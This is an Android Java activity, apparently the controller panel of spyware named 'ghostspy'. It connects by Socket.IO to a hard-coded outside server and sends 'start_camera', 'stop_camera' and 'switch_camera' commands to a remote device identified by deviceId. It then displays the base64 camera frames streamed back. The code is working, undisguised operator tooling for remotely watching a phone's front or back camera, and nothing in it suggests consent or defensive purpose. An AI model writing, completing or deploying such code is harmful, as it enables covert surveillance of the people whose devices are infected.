package com.testapp;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.Gravity;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class CameraActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private ImageView cameraView;
    private Button switchBtn, playBtn, stopBtn;
    private TextView statusText;
    private Handler handler = new Handler();
    private boolean isPlaying = false;
    private String currentCamera = "back"; // back/front

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0B0B0B);
        root.setPadding(16, 16, 16, 16);

        // Header
        TextView title = new TextView(this);
        title.setText("📷 Live Camera");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        root.addView(title);

        statusText = new TextView(this);
        statusText.setText("Status: Siap");
        statusText.setTextColor(0xFF9AA3B2);
        root.addView(statusText);

        // Kamera view
        cameraView = new ImageView(this);
        cameraView.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams camParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0);
        camParams.weight = 1;
        camParams.setMargins(0, 16, 0, 16);
        cameraView.setLayoutParams(camParams);
        cameraView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        root.addView(cameraView);

        // Tombol kontrol di bawah
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        switchBtn = new Button(this);
        switchBtn.setText("🔄 " + currentCamera);
        switchBtn.setTextColor(0xFFFFFFFF);
        switchBtn.setBackgroundColor(0xFF151515);
        switchBtn.setOnClickListener(v -> {
            if (currentCamera.equals("back")) {
                currentCamera = "front";
                sendCmd("switch_camera", new JSONObject() {{ try { put("camera", "front"); } catch (Exception e) {} }});
            } else {
                currentCamera = "back";
                sendCmd("switch_camera", new JSONObject() {{ try { put("camera", "back"); } catch (Exception e) {} }});
            }
            switchBtn.setText("🔄 " + currentCamera);
        });
        btnRow.addView(switchBtn);

        playBtn = new Button(this);
        playBtn.setText("▶ Play");
        playBtn.setTextColor(0xFFFFFFFF);
        playBtn.setBackgroundColor(0xFF00E676);
        playBtn.setOnClickListener(v -> {
            if (!isPlaying) {
                sendCmd("start_camera");
                isPlaying = true;
                statusText.setText("Status: Streaming...");
            }
        });
        btnRow.addView(playBtn);

        stopBtn = new Button(this);
        stopBtn.setText("⏹ Stop");
        stopBtn.setTextColor(0xFFFFFFFF);
        stopBtn.setBackgroundColor(0xFFFF1744);
        stopBtn.setOnClickListener(v -> {
            if (isPlaying) {
                sendCmd("stop_camera");
                isPlaying = false;
                statusText.setText("Status: Berhenti");
            }
        });
        btnRow.addView(stopBtn);

        root.addView(btnRow);
        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        socket.on("camera_frame", args -> {
            try {
                String b64 = (String) args[0];
                byte[] img = Base64.decode(b64, Base64.DEFAULT);
                Bitmap bmp = BitmapFactory.decodeByteArray(img, 0, img.length);
                runOnUiThread(() -> cameraView.setImageBitmap(bmp));
            } catch (Exception e) {}
        });
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
            } catch (Exception e) {}
        }
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    @Override
    protected void onDestroy() {
        sendCmd("stop_camera");
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
